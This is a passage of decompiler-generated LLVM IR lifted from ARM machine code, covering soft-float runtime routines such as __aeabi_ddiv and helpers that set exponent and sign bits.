  store i32 %v7_1f24c, i32* %r4.global-to-local, align 4
  store i32 %v12_1f174, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_1f250 = phi i32 [ %v0_1f250.pre, %._crit_edge23 ], [ %v12_1f174, %bb48 ]
  %v6_1f250 = xor i1 %v4_1f248, true
  call void @__pseudo_cond_branch(i1 %v6_1f250, i32 %v0_1f250)
  %v0_1f254 = load i32, i32* %r1.global-to-local, align 4
  %v1_1f254 = or i32 %v0_1f254, 1048576
  store i32 %v1_1f254, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_1f25c = load i32, i32* %r4.global-to-local, align 4
  %v1_1f25c = add i32 %v0_1f25c, -1
  store i32 %v1_1f25c, i32* %r4.global-to-local, align 4
  ret i32 %v4_1f238

; uselistorder directives
  uselistorder i32 %v5_1f240, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_1f240, { 2, 1, 0 }
  uselistorder i32 %v1_1f21c, { 2, 0, 1 }
  uselistorder i32 %v0_1f218, { 1, 0 }
  uselistorder i1 %v7_1f20c, { 1, 0 }
  uselistorder i32 %v2_1f1ec, { 1, 0 }
  uselistorder i1 %v1_1f1ec, { 1, 0 }
  uselistorder i32 %v6_1f1e4, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1f1ec, { 1, 0, 2 }
  uselistorder i32 %v14_1f1d0, { 1, 3, 2, 0 }
  uselistorder i64 %v11_1f1d0, { 1, 0 }
  uselistorder i64 %v12_1f1c8, { 1, 0 }
  uselistorder i64 %v10_1f1c8, { 1, 0 }
  uselistorder i64 %v7_1f1c0, { 1, 0 }
  uselistorder i64 %v6_1f1b8, { 1, 0 }
  uselistorder i32 %v6_1f1a0, { 1, 0 }
  uselistorder i32 %v6_1f19c, { 1, 0, 2 }
  uselistorder i32 %v1_1f19c, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_1f194, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_1f184, { 2, 1, 0 }
  uselistorder i32 %v5_1f180, { 2, 1, 0 }
  uselistorder i32 %v12_1f174, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 10, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i32 -255, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_1f230, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_1f1f8, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_1f260() local_unnamed_addr {
dec_label_pc_1f260:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_1f260 = load i1, i1* @cpsr_z, align 1
  %v1_1f260 = load i1, i1* @cpsr_n, align 1
  %v2_1f260 = load i1, i1* @cpsr_v, align 1
  %v3_1f260 = xor i1 %v1_1f260, %v2_1f260
  %v4_1f260 = or i1 %v0_1f260, %v3_1f260
  br i1 %v4_1f260, label %dec_label_pc_1f264, label %dec_label_pc_1f3dc

dec_label_pc_1f264:                               ; preds = %dec_label_pc_1f260
  %v0_1f264 = load i32, i32* @r4, align 4
  %v4_1f264 = add i32 %v0_1f264, 54
  %v6_1f264 = sub i32 0, %v0_1f264
  %v7_1f264 = and i32 %v4_1f264, %v6_1f264
  %v8_1f264 = icmp slt i32 %v7_1f264, 0
  %v9_1f264 = icmp slt i32 %v4_1f264, 0
  %v10_1f264 = icmp eq i32 %v4_1f264, 0
  %v7_1f268 = icmp sgt i32 %v0_1f264, -54
  br i1 %v7_1f268, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1f264
  store i32 0, i32* @r0, align 4
  %v8_1f26c = load i32, i32* @r1, align 4
  %v9_1f26c = and i32 %v8_1f26c, -2147483648
  store i32 %v9_1f26c, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1f264, %bb
  %v4_1f274 = xor i1 %v9_1f264, %v8_1f264
  %v5_1f274 = or i1 %v10_1f264, %v4_1f274
  call void @__pseudo_cond_branch(i1 %v5_1f274, i32 %tmp7)
  %v0_1f278 = load i32, i32* @r4, align 4
  %v1_1f278 = sub i32 0, %v0_1f278
  %v2_1f27c = sub i32 -32, %v0_1f278
  %v4_1f27c = add i32 %v0_1f278, 31
  %v5_1f27c = and i32 %v4_1f27c, %v1_1f278
  %v6_1f27c = icmp slt i32 %v5_1f27c, 0
  store i1 %v6_1f27c, i1* @cpsr_v, align 1
  %v6_1f280 = icmp slt i32 %v1_1f278, 32
  br i1 %v6_1f280, label %dec_label_pc_1f284, label %dec_label_pc_1f2f0

dec_label_pc_1f284:                               ; preds = %.thread1
  %v1_1f284 = add i32 %v2_1f27c, 12
  %v8_1f288 = icmp sgt i32 %v1_1f284, 0
  br i1 %v8_1f288, label %dec_label_pc_1f2c0, label %dec_label_pc_1f28c

dec_label_pc_1f28c:                               ; preds = %dec_label_pc_1f284
  %v1_1f28c = add i32 %v2_1f27c, 32
  %v1_1f290 = sub i32 0, %v2_1f27c
  %v0_1f294 = load i32, i32* @r0, align 4
  %v6_1f294 = shl i32 %v0_1f294, %v1_1f290
  %v2_1f298 = add i32 %v2_1f27c, 31
  %v3_1f298 = shl i32 1, %v2_1f298
  %v6_1f298 = lshr i32 %v0_1f294, %v1_1f28c
  %v1_1f29c = load i32, i32* @r1, align 4
  %v7_1f29c = shl i32 %v1_1f29c, %v1_1f290
  %v8_1f29c = or i32 %v7_1f29c, %v6_1f298
  %v1_1f2a0 = and i32 %v1_1f29c, -2147483648
  %tmp = bitcast i32 %v1_1f29c to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_1f2a4 = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_1f294, 0
  %v4_1f2a8 = zext i1 %tmp20 to i32
  %v5_1f2a8 = add i32 %v8_1f29c, %v4_1f2a8
  %v5_1f2ac = and i32 %v1_1f2a4, %v3_1f298
  %v6_1f2ac = icmp ne i32 %v5_1f2ac, 0
  %v7_1f2ac = lshr i32 %v1_1f2a4, %v1_1f28c
  %v9_1f2ac = add i32 %v7_1f2ac, %v1_1f2a0
  %v10_1f2ac = zext i1 %v6_1f2ac to i32
  %v11_1f2ac = add i32 %v9_1f2ac, %v10_1f2ac
  store i32 %v11_1f2ac, i32* @r1, align 4
  %v19_1f2ac = add i32 %v11_1f2ac, %v10_1f2ac
  %v20_1f2ac = xor i32 %v19_1f2ac, %v1_1f29c
  %v21_1f2ac = xor i32 %v19_1f2ac, %v7_1f2ac
  %v22_1f2ac = and i32 %v20_1f2ac, %v21_1f2ac
  %v23_1f2ac = icmp slt i32 %v22_1f2ac, 0
  store i1 %v23_1f2ac, i1* @cpsr_v, align 1
  %v3_1f2b0 = mul i32 %v6_1f294, 2
  %v4_1f2b0 = or i32 %v3_1f2b0, %tmp7
  %v5_1f2b0 = icmp slt i32 %v4_1f2b0, 0
  store i1 %v5_1f2b0, i1* @cpsr_n, align 1
  %v6_1f2b0 = icmp eq i32 %v4_1f2b0, 0
  store i1 %v6_1f2b0, i1* @cpsr_z, align 1
  br i1 %v6_1f2b0, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_1f28c
  %tmp21 = sext i1 %tmp20 to i32
  %v6_1f2b4 = add nsw i32 %tmp21, -1
  %v7_1f2b4 = and i32 %v5_1f2a8, %v6_1f2b4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_1f28c, %bb13
  %v1_1f2bc = phi i32 [ %v5_1f2a8, %dec_label_pc_1f28c ], [ %v7_1f2b4, %bb13 ]
  %v2_1f2b8 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1f2b8, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1f2bc

dec_label_pc_1f2c0:                               ; preds = %dec_label_pc_1f284
  %v1_1f2c0 = sub i32 0, %v2_1f27c
  %v1_1f2c4 = add i32 %v2_1f27c, 32
  %v0_1f2c8 = load i32, i32* @r0, align 4
  %v6_1f2c8 = shl i32 %v0_1f2c8, %v1_1f2c0
  %v6_1f2cc = lshr i32 %v0_1f2c8, %v1_1f2c4
  %v1_1f2d0 = load i32, i32* @r1, align 4
  %v7_1f2d0 = shl i32 %v1_1f2d0, %v1_1f2c0
  %v8_1f2d0 = or i32 %v7_1f2d0, %v6_1f2cc
  %v1_1f2d4 = and i32 %v1_1f2d0, -2147483648
  %tmp22 = icmp slt i32 %v6_1f2c8, 0
  %v4_1f2d8 = zext i1 %tmp22 to i32
  %v5_1f2d8 = add i32 %v8_1f2d0, %v4_1f2d8
  %v6_1f2d8 = icmp ult i32 %v5_1f2d8, %v8_1f2d0
  %v2_1f2dc = zext i1 %v6_1f2d8 to i32
  %v3_1f2dc = or i32 %v2_1f2dc, %v1_1f2d4
  store i32 %v3_1f2dc, i32* @r1, align 4
  %v9_1f2dc = add nsw i32 %v3_1f2dc, %v2_1f2dc
  %v10_1f2dc = sub i32 0, %v1_1f2d0
  %v11_1f2dc = and i32 %v9_1f2dc, %v10_1f2dc
  %v12_1f2dc = icmp slt i32 %v11_1f2dc, 0
  store i1 %v12_1f2dc, i1* @cpsr_v, align 1
  %v3_1f2e0 = mul i32 %v6_1f2c8, 2
  %v4_1f2e0 = or i32 %v3_1f2e0, %tmp7
  %v5_1f2e0 = icmp slt i32 %v4_1f2e0, 0
  store i1 %v5_1f2e0, i1* @cpsr_n, align 1
  %v6_1f2e0 = icmp eq i32 %v4_1f2e0, 0
  store i1 %v6_1f2e0, i1* @cpsr_z, align 1
  br i1 %v6_1f2e0, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1f2c0
  %tmp23 = sext i1 %tmp22 to i32
  %v6_1f2e4 = add nsw i32 %tmp23, -1
  %v7_1f2e4 = and i32 %v5_1f2d8, %v6_1f2e4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1f2c0, %bb15
  %v1_1f2ec = phi i32 [ %v5_1f2d8, %dec_label_pc_1f2c0 ], [ %v7_1f2e4, %bb15 ]
  %v2_1f2e8 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1f2e8, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1f2ec

dec_label_pc_1f2f0:                               ; preds = %.thread1
  %v1_1f2f0 = sub i32 32, %v2_1f27c
  %v1_1f2f4 = load i32, i32* @r0, align 4
  %v7_1f2f4 = shl i32 %v1_1f2f4, %v1_1f2f0
  %v8_1f2f4 = or i32 %v7_1f2f4, %tmp7
  %v6_1f2f8 = lshr i32 %v1_1f2f4, %v2_1f27c
  %v1_1f2fc = load i32, i32* @r1, align 4
  %v7_1f2fc = shl i32 %v1_1f2fc, %v1_1f2f0
  %v8_1f2fc = or i32 %v7_1f2fc, %v6_1f2f8
  %v6_1f300 = lshr i32 %v1_1f2fc, %v2_1f27c
  %v1_1f304 = and i32 %v1_1f2fc, -2147483648
  store i32 %v1_1f304, i32* @r1, align 4
  %v7_1f308 = lshr i32 %v1_1f304, %v2_1f27c
  %v8_1f308 = sub i32 -1, %v7_1f308
  %v9_1f308 = and i32 %v6_1f300, %v8_1f308
  %tmp24 = icmp slt i32 %v8_1f2fc, 0
  %v4_1f30c = zext i1 %tmp24 to i32
  %v5_1f30c = add i32 %v4_1f30c, %v9_1f308
  %v3_1f310 = mul i32 %v8_1f2fc, 2
  %v4_1f310 = or i32 %v8_1f2f4, %v3_1f310
  %v5_1f310 = icmp slt i32 %v4_1f310, 0
  store i1 %v5_1f310, i1* @cpsr_n, align 1
  %v6_1f310 = icmp eq i32 %v4_1f310, 0
  store i1 %v6_1f310, i1* @cpsr_z, align 1
  br i1 %v6_1f310, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_1f2f0
  %tmp25 = sext i1 %tmp24 to i32
  %v6_1f314 = add nsw i32 %tmp25, -1
  %v7_1f314 = and i32 %v5_1f30c, %v6_1f314
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1f2f0, %bb17
  %v1_1f31c = phi i32 [ %v5_1f30c, %dec_label_pc_1f2f0 ], [ %v7_1f314, %bb17 ]
  %v2_1f318 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1f318, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1f31c

dec_label_pc_1f3dc:                               ; preds = %dec_label_pc_1f260
  %v0_1f3dc = load i32, i32* @r1, align 4
  %v1_1f3dc = and i32 %v0_1f3dc, -2147483648
  %v1_1f3e4 = or i32 %v1_1f3dc, 2146435072
  store i32 %v1_1f3e4, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_1f30c, { 1, 0 }
  uselistorder i32 %v5_1f2d8, { 1, 0, 2 }
  uselistorder i32 %v8_1f2d0, { 1, 0 }
  uselistorder i32 %v1_1f2c0, { 1, 0 }
  uselistorder i32 %v5_1f2a8, { 1, 0 }
  uselistorder i32 %v1_1f29c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1f290, { 1, 0 }
  uselistorder i32 %v2_1f27c, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_1f278, { 1, 0 }
  uselistorder i32 %v4_1f264, { 1, 2, 0 }
  uselistorder i32 %v0_1f264, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 12, { 59, 60, 61, 68, 8, 69, 72, 3, 1, 2, 73, 74, 5, 0, 4, 84, 27, 10, 31, 11, 12, 70, 71, 28, 29, 30, 75, 76, 77, 78, 79, 13, 80, 67, 14, 85, 86, 9, 140, 141, 142, 143, 144, 146, 147, 145, 148, 149, 150, 151, 152, 153, 154, 15, 16, 17, 18, 20, 19, 21, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 81, 82, 22, 23, 62, 63, 64, 65, 66, 32, 33, 24, 34, 35, 36, 52, 57, 37, 38, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 6, 25, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 136, 129, 130, 131, 132, 133, 134, 135, 137, 138, 26, 139, 83, 7, 100, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 54, 55, 56, 58 }
  uselistorder i32 -32, { 4, 3, 5, 9, 10, 14, 11, 15, 16, 0, 12, 2, 13, 6, 8, 7, 1, 17 }
  uselistorder i32 54, { 4, 0, 1, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_1f3f4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1f3f4:
  %v1_1f3f8 = or i32 %arg1, 2146959360
  store i32 %v1_1f3f8, i32* @r1, align 4
  %v1_1f400 = load i32, i32* @r0, align 4
  ret i32 %v1_1f400
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1f404 = load i32, i32* @r4, align 4
  store i32 %v3_1f404, i32* %stack_var_-16, align 4
  %v6_1f404 = load i32, i32* @r5, align 4
  %v9_1f404 = load i32, i32* @r6, align 4
  %v12_1f404 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_1f410 = load i32, i32* @r1, align 4
  %v4_1f410 = udiv i32 %v1_1f410, 1048576
  %v5_1f410 = urem i32 %v4_1f410, 2048
  store i32 %v5_1f410, i32* @r4, align 4
  %v6_1f410 = icmp eq i32 %v5_1f410, 0
  br i1 %v6_1f410, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_1f414 = udiv i32 %arg4, 1048576
  %v6_1f414 = urem i32 %v5_1f414, 2048
  store i32 %v6_1f414, i32* %r5.global-to-local, align 4
  %v7_1f414 = icmp eq i32 %v6_1f414, 0
  br i1 %v7_1f414, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_1f5a0

bb90:                                             ; preds = %bb
  %v5_1f418 = icmp eq i32 %v5_1f410, 2047
  br i1 %v5_1f418, label %.thread2, label %bb91

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %entry..thread2_crit_edge ], [ %v5_1f414, %bb90 ]
  br label %dec_label_pc_1f5a0

bb91:                                             ; preds = %bb90
  %v5_1f41c = icmp eq i32 %v6_1f414, 2047
  br i1 %v5_1f41c, label %dec_label_pc_1f5a0, label %dec_label_pc_1f424

dec_label_pc_1f424:                               ; preds = %bb91
  %v2_1f424 = sub nsw i32 %v5_1f410, %v6_1f414
  store i32 %v2_1f424, i32* %r4.global-to-local, align 4
  %v2_1f428 = xor i32 %v1_1f410, %arg4
  %v4_1f42c = mul i32 %arg4, 4096
  %v5_1f42c = or i32 %v4_1f42c, %arg3
  store i32 %v5_1f42c, i32* %r5.global-to-local, align 4
  %v7_1f42c = icmp eq i32 %v5_1f42c, 0
  %v3_1f430 = mul i32 %v1_1f410, 4096
  store i32 %v3_1f430, i32* %r1.global-to-local, align 4
  br i1 %v7_1f42c, label %dec_label_pc_1f56c, label %dec_label_pc_1f438

dec_label_pc_1f438:                               ; preds = %dec_label_pc_1f424
  %tmp92 = mul i32 %arg4, 256
  %v4_1f440 = and i32 %tmp92, 268435200
  %v4_1f444 = udiv i32 %arg3, 16777216
  %v5_1f440 = or i32 %v4_1f444, %v4_1f440
  %v5_1f444 = or i32 %v5_1f440, 268435456
  store i32 %v5_1f444, i32* %r3.global-to-local, align 4
  %v3_1f448 = mul i32 %arg3, 256
  store i32 %v3_1f448, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_1f410, 256
  %v4_1f44c = and i32 %tmp93, 268435200
  %v1_1f450 = load i32, i32* @r0, align 4
  %v4_1f450 = udiv i32 %v1_1f450, 16777216
  %v5_1f44c = or i32 %v4_1f44c, %v4_1f450
  %v5_1f450 = or i32 %v5_1f44c, 268435456
  store i32 %v5_1f450, i32* %r5.global-to-local, align 4
  %v3_1f454 = mul i32 %v1_1f450, 256
  store i32 %v3_1f454, i32* %r6.global-to-local, align 4
  %v1_1f458 = and i32 %v2_1f428, -2147483648
  store i32 %v1_1f458, i32* %r1.global-to-local, align 4
  %v3_1f45c = icmp uge i32 %v5_1f450, %v5_1f444
  %v9_1f45c = icmp eq i32 %v5_1f450, %v5_1f444
  br i1 %v9_1f45c, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_1f438
  %v4_1f460 = icmp uge i32 %v3_1f454, %v3_1f448
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_1f438, %bb94
  %v1_1f464 = phi i1 [ %v3_1f45c, %dec_label_pc_1f438 ], [ %v4_1f460, %bb94 ]
  %v2_1f464 = add nsw i32 %v2_1f424, 253
  %v3_1f464 = zext i1 %v1_1f464 to i32
  %v4_1f464 = add nsw i32 %v2_1f464, %v3_1f464
  %v8_1f464 = icmp ule i32 %v4_1f464, %v2_1f424
  %v9_1f464 = icmp ugt i32 %v2_1f424, -254
  %v10_1f464 = select i1 %v1_1f464, i1 %v8_1f464, i1 %v9_1f464
  %v1_1f468 = add nsw i32 %v4_1f464, 768
  store i32 %v1_1f468, i32* %r4.global-to-local, align 4
  br i1 %v10_1f464, label %dec_label_pc_1f478, label %dec_label_pc_1f470

dec_label_pc_1f470:                               ; preds = %bb95
  %v3_1f470 = udiv i32 %v5_1f444, 2
  store i32 %v3_1f470, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1f478

dec_label_pc_1f478:                               ; preds = %bb95, %dec_label_pc_1f470
  %v0_1f480 = phi i32 [ %v5_1f444, %bb95 ], [ %v3_1f470, %dec_label_pc_1f470 ]
  %v0_1f484 = phi i32 [ %v3_1f448, %bb95 ], [ 0, %dec_label_pc_1f470 ]
  %v2_1f478 = sub i32 %v3_1f454, %v0_1f484
  store i32 %v2_1f478, i32* %r6.global-to-local, align 4
  %v3_1f478 = icmp uge i32 %v3_1f454, %v0_1f484
  %v3_1f47c = icmp eq i1 %v3_1f478, false
  %v4_1f47c = sub nsw i32 %v5_1f450, %v0_1f480
  %v6_1f47c = sext i1 %v3_1f47c to i32
  %v7_1f47c = add nsw i32 %v6_1f47c, %v4_1f47c
  store i32 %v7_1f47c, i32* %r5.global-to-local, align 4
  %v3_1f480 = udiv i32 %v0_1f480, 2
  store i32 %v3_1f480, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1f490.outer

dec_label_pc_1f490.outer:                         ; preds = %dec_label_pc_1f528, %dec_label_pc_1f478
  %v1_1f53c.ph = phi i32 [ %v2_1f528, %dec_label_pc_1f528 ], [ %v1_1f458, %dec_label_pc_1f478 ]
  %v0_1f494.ph = phi i32 [ %v5_1f504, %dec_label_pc_1f528 ], [ %v7_1f47c, %dec_label_pc_1f478 ]
  %v1_1f498.ph = phi i32 [ %v3_1f508, %dec_label_pc_1f528 ], [ %v2_1f478, %dec_label_pc_1f478 ]
  %v5_1f51017.ph = phi i32 [ %v5_1f510, %dec_label_pc_1f528 ], [ %v3_1f480, %dec_label_pc_1f478 ]
  %v3_1f51413.ph = phi i32 [ %v3_1f514, %dec_label_pc_1f528 ], [ 0, %dec_label_pc_1f478 ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_1f528 ], [ 1048576, %dec_label_pc_1f478 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_1f528 ], [ 524288, %dec_label_pc_1f478 ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1f490

dec_label_pc_1f490:                               ; preds = %dec_label_pc_1f490.outer, %dec_label_pc_1f500
  %v1_1f4f459 = phi i32 [ %v2_1f53c, %dec_label_pc_1f500 ], [ %storemerge133, %dec_label_pc_1f490.outer ]
  %v1_1f4a0 = phi i32 [ %v1_1f4a032, %dec_label_pc_1f500 ], [ %storemerge133, %dec_label_pc_1f490.outer ]
  %v1_1f4bc41 = phi i32 [ %v1_1f4bc43, %dec_label_pc_1f500 ], [ %storemerge133, %dec_label_pc_1f490.outer ]
  %v1_1f4d850 = phi i32 [ %v1_1f4d852, %dec_label_pc_1f500 ], [ %storemerge133, %dec_label_pc_1f490.outer ]
  %v0_1f518 = phi i32 [ %v3_1f518, %dec_label_pc_1f500 ], [ %storemerge, %dec_label_pc_1f490.outer ]
  %v0_1f494 = phi i32 [ %v5_1f504, %dec_label_pc_1f500 ], [ %v0_1f494.ph, %dec_label_pc_1f490.outer ]
  %v1_1f498 = phi i32 [ %v3_1f508, %dec_label_pc_1f500 ], [ %v1_1f498.ph, %dec_label_pc_1f490.outer ]
  %v5_1f51017 = phi i32 [ %v5_1f510, %dec_label_pc_1f500 ], [ %v5_1f51017.ph, %dec_label_pc_1f490.outer ]
  %v3_1f51413 = phi i32 [ %v3_1f514, %dec_label_pc_1f500 ], [ %v3_1f51413.ph, %dec_label_pc_1f490.outer ]
  %v3_1f490 = icmp uge i32 %v1_1f498, %v3_1f51413
  %v3_1f494 = icmp eq i1 %v3_1f490, false
  %v4_1f494 = sub i32 %v0_1f494, %v5_1f51017
  %v6_1f494 = sext i1 %v3_1f494 to i32
  %v7_1f494 = add i32 %v6_1f494, %v4_1f494
  %v8_1f494 = zext i1 %v3_1f494 to i32
  %v9_1f494 = sub i32 %v7_1f494, %v8_1f494
  %v10_1f494 = icmp ult i32 %v0_1f494, %v9_1f494
  %v11_1f494 = icmp ne i32 %v5_1f51017, -1
  %v12_1f494 = or i1 %v11_1f494, %v10_1f494
  %v13_1f494 = icmp ult i32 %v0_1f494, %v5_1f51017
  %v14_1f494 = select i1 %v3_1f494, i1 %v12_1f494, i1 %v13_1f494
  br i1 %v14_1f494, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_1f490
  %v3_1f498 = sub i32 %v1_1f498, %v3_1f51413
  store i32 %v3_1f498, i32* %r6.global-to-local, align 4
  store i32 %v7_1f494, i32* %r5.global-to-local, align 4
  %v3_1f4a0 = or i32 %v1_1f4a0, %v0_1f518
  store i32 %v3_1f4a0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1f490, %bb96
  %v1_1f4f458 = phi i32 [ %v1_1f4f459, %dec_label_pc_1f490 ], [ %v3_1f4a0, %bb96 ]
  %v1_1f4a035 = phi i32 [ %v1_1f4a0, %dec_label_pc_1f490 ], [ %v3_1f4a0, %bb96 ]
  %v1_1f4bc = phi i32 [ %v1_1f4bc41, %dec_label_pc_1f490 ], [ %v3_1f4a0, %bb96 ]
  %v1_1f4d849 = phi i32 [ %v1_1f4d850, %dec_label_pc_1f490 ], [ %v3_1f4a0, %bb96 ]
  %v0_1f4b0 = phi i32 [ %v0_1f494, %dec_label_pc_1f490 ], [ %v7_1f494, %bb96 ]
  %v1_1f4b4 = phi i32 [ %v1_1f498, %dec_label_pc_1f490 ], [ %v3_1f498, %bb96 ]
  %v1_1f4a4 = urem i32 %v5_1f51017, 2
  %v2_1f4a4 = icmp ne i32 %v1_1f4a4, 0
  %v3_1f4a4 = udiv i32 %v5_1f51017, 2
  %v3_1f4a8 = zext i1 %v2_1f4a4 to i32
  %v6_1f4a8 = zext i32 %v3_1f51413 to i64
  %v7_1f4a8 = sub i32 33, %v3_1f51413
  %v8_1f4a8 = zext i32 %v7_1f4a8 to i64
  %v9_1f4a8 = shl i64 %v6_1f4a8, %v8_1f4a8
  %v10_1f4a8 = sub i32 32, %v3_1f51413
  %v11_1f4a8 = shl i32 %v3_1f4a8, %v10_1f4a8
  %v12_1f4a8 = zext i32 %v11_1f4a8 to i64
  %v14_1f4a8 = or i64 %v12_1f4a8, %v9_1f4a8
  %v15_1f4a8 = trunc i64 %v14_1f4a8 to i32
  %v3_1f4ac = icmp uge i32 %v1_1f4b4, %v15_1f4a8
  %v3_1f4b0 = icmp eq i1 %v3_1f4ac, false
  %v4_1f4b0 = sub i32 %v0_1f4b0, %v3_1f4a4
  %v6_1f4b0 = sext i1 %v3_1f4b0 to i32
  %v7_1f4b0 = add i32 %v6_1f4b0, %v4_1f4b0
  %v13_1f4b0 = icmp ult i32 %v0_1f4b0, %v3_1f4a4
  %v14_1f4b0 = or i1 %v13_1f4b0, %v3_1f4b0
  br i1 %v14_1f4b0, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_1f4b4 = sub i32 %v1_1f4b4, %v15_1f4a8
  store i32 %v3_1f4b4, i32* %r6.global-to-local, align 4
  store i32 %v7_1f4b0, i32* %r5.global-to-local, align 4
  %v5_1f4bc = udiv i32 %v0_1f518, 2
  %v6_1f4bc = or i32 %v1_1f4bc, %v5_1f4bc
  store i32 %v6_1f4bc, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_1f4f457 = phi i32 [ %v1_1f4f458, %.thread4 ], [ %v6_1f4bc, %bb97 ]
  %v1_1f4a034 = phi i32 [ %v1_1f4a035, %.thread4 ], [ %v6_1f4bc, %bb97 ]
  %v1_1f4bc45 = phi i32 [ %v1_1f4bc, %.thread4 ], [ %v6_1f4bc, %bb97 ]
  %v1_1f4d8 = phi i32 [ %v1_1f4d849, %.thread4 ], [ %v6_1f4bc, %bb97 ]
  %v0_1f4cc = phi i32 [ %v0_1f4b0, %.thread4 ], [ %v7_1f4b0, %bb97 ]
  %v1_1f4d0 = phi i32 [ %v1_1f4b4, %.thread4 ], [ %v3_1f4b4, %bb97 ]
  %v1_1f4c0 = urem i32 %v3_1f4a4, 2
  %v2_1f4c0 = icmp ne i32 %v1_1f4c0, 0
